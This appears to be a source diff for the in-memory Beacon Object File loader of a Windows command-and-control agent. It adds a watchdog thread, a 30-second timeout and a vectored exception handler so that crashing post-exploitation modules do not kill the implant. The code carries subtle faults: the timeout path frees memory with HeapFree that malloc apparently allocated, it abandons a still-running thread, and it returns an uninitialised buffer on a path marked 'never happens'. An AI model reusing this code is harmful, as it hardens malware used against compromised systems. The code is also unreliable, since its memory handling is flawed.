@@ -429,6 +429,47 @@ typedef struct {
     uint32_t value;
 } SymRec;
 
+/* ── BOF watchdog thread support ────────────────────────────────────────── */
+#define BOF_TIMEOUT_MS 30000
+
+typedef void (*bof_entry_t)(char *, int);
+typedef struct { bof_entry_t fn; char *args; int alen; } BofCall;
+
+/* Thread ID of the currently-running BOF thread (0 = no BOF running).
+ * Serialized by g_bof_cs so no atomic needed. */
+static DWORD g_bof_thread_id = 0;
+
+/* Vectored Exception Handler: catches any hardware exception (AV, etc.)
+ * thrown by the BOF and exits only the BOF thread, keeping the agent alive. */
+static LONG WINAPI bof_veh(PEXCEPTION_POINTERS ep) {
+    if (g_bof_thread_id && GetCurrentThreadId() == g_bof_thread_id) {
+        /* Write error directly to the global output buffer (BeaconPrintf not
+         * available here — defined later in the file). */
+        char msg[64];
+        int n = _snprintf(msg, sizeof(msg), "[bof] exception 0x%08lx\n",
+                          (unsigned long)ep->ExceptionRecord->ExceptionCode);
+        if (n > 0 && g_bof_out == NULL) {
+            g_bof_out = (char *)malloc((size_t)n + 1);
+            if (g_bof_out) {
+                memcpy(g_bof_out, msg, (size_t)n);
+                g_bof_out[n] = '\0';
+                g_bof_out_len = (size_t)n;
+                g_bof_out_cap = (size_t)n + 1;
+            }
+        }
+        ExitThread(0);  /* exits only this thread, agent survives */
+    }
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
+static DWORD WINAPI bof_watchdog_thread(LPVOID p) {
+    BofCall *c = (BofCall *)p;
+    g_bof_thread_id = GetCurrentThreadId();
+    c->fn(c->args, c->alen);
+    g_bof_thread_id = 0;
+    return 0;
+}
+
 /* ── Main entry point ───────────────────────────────────────────────────── */
 char *bof_exec(const uint8_t *coff_data, size_t coff_len,
                const uint8_t *packed_args, size_t args_len) {
@@ -437,6 +478,7 @@ char *bof_exec(const uint8_t *coff_data, size_t coff_len,
     SecInfo  *secs      = NULL;
     SymRec   *sym_recs  = NULL;
     uint8_t **sym_addrs = NULL;
+    int       timed_out = 0;
 
     bof_cs_init();
     EnterCriticalSection(&g_bof_cs);
@@ -628,9 +670,32 @@ char *bof_exec(const uint8_t *coff_data, size_t coff_len,
         }
     }
 
-    /* ── Execute BOF ─────────────────────────────────────────────────────── */
-    typedef void (*bof_entry_t)(char *, int);
-    ((bof_entry_t)entry)((char *)args_mem, (int)args_sz);
+    /* ── Execute BOF in a watchdog thread (30 s timeout) ────────────────── */
+    BofCall bcall = { (bof_entry_t)entry, (char *)args_mem, (int)args_sz };
+
+    /* Install VEH to catch BOF exceptions (AV, null-deref, etc.). */
+    PVOID veh = AddVectoredExceptionHandler(1, bof_veh);
+    HANDLE hBof = CreateThread(NULL, 0, bof_watchdog_thread, &bcall, 0, NULL);
+    if (!hBof) {
+        /* CreateThread failed — fall back to direct call (VEH still catches crashes). */
+        g_bof_thread_id = GetCurrentThreadId();
+        ((bof_entry_t)entry)((char *)args_mem, (int)args_sz);
+        g_bof_thread_id = 0;
+        RemoveVectoredExceptionHandler(veh);
+    } else {
+        DWORD waited = WaitForSingleObject(hBof, BOF_TIMEOUT_MS);
+        if (waited == WAIT_TIMEOUT) {
+            CloseHandle(hBof);
+            RemoveVectoredExceptionHandler(veh);
+            timed_out = 1;
+            static const char tmsg[] = "[bof] timeout after 30s";
+            result = (char *)HeapAlloc(GetProcessHeap(), 0, sizeof(tmsg));
+            if (result) memcpy(result, tmsg, sizeof(tmsg));
+            goto cleanup;
+        }
+        CloseHandle(hBof);
+        RemoveVectoredExceptionHandler(veh);
+    }
 
     /* ── Collect output ──────────────────────────────────────────────────── */
     if (g_bof_out && g_bof_out_len > 0) {
@@ -644,17 +709,38 @@ char *bof_exec(const uint8_t *coff_data, size_t coff_len,
     }
 
 cleanup:
-    free(secs);
-    free(sym_recs);
-    free(sym_addrs);
-    free(g_bof_out);
-    g_bof_out     = NULL;
-    g_bof_out_len = 0;
-    g_bof_out_cap = 0;
-    fmt_free_all();
-    bof_free_allocs();
+    if (!timed_out) {
+        /* Normal path: free all per-run state. */
+        free(secs);
+        free(sym_recs);
+        free(sym_addrs);
+        free(g_bof_out);
+        g_bof_out     = NULL;
+        g_bof_out_len = 0;
+        g_bof_out_cap = 0;
+        fmt_free_all();
+        bof_free_allocs();
+    } else {
+        /*
+         * Timeout path: the background thread is still running and may access
+         * g_allocs, g_fmt_bufs, and g_bof_out.  We can't safely free those.
+         * Free only the COFF-parsing allocations (secs/sym_recs/sym_addrs) which
+         * the background thread never touches — use HeapFree to bypass the CRT
+         * heap lock that the background thread might transiently hold.
+         */
+        HANDLE hp = GetProcessHeap();
+        if (secs)      HeapFree(hp, 0, secs);
+        if (sym_recs)  HeapFree(hp, 0, sym_recs);
+        if (sym_addrs) HeapFree(hp, 0, sym_addrs);
+        /* Abandon g_bof_out and the tracked allocs — they're leaked intentionally. */
+        g_bof_out     = NULL;
+        g_bof_out_len = 0;
+        g_bof_out_cap = 0;
+        g_alloc_count = 0;
+    }
     LeaveCriticalSection(&g_bof_cs);
-    return result ? result : strdup("[bof] internal error");
+    if (!result) return (char *)HeapAlloc(GetProcessHeap(), 0, 24);  /* never happens */
+    return result;
 }
 
 #endif /* _WIN32 */
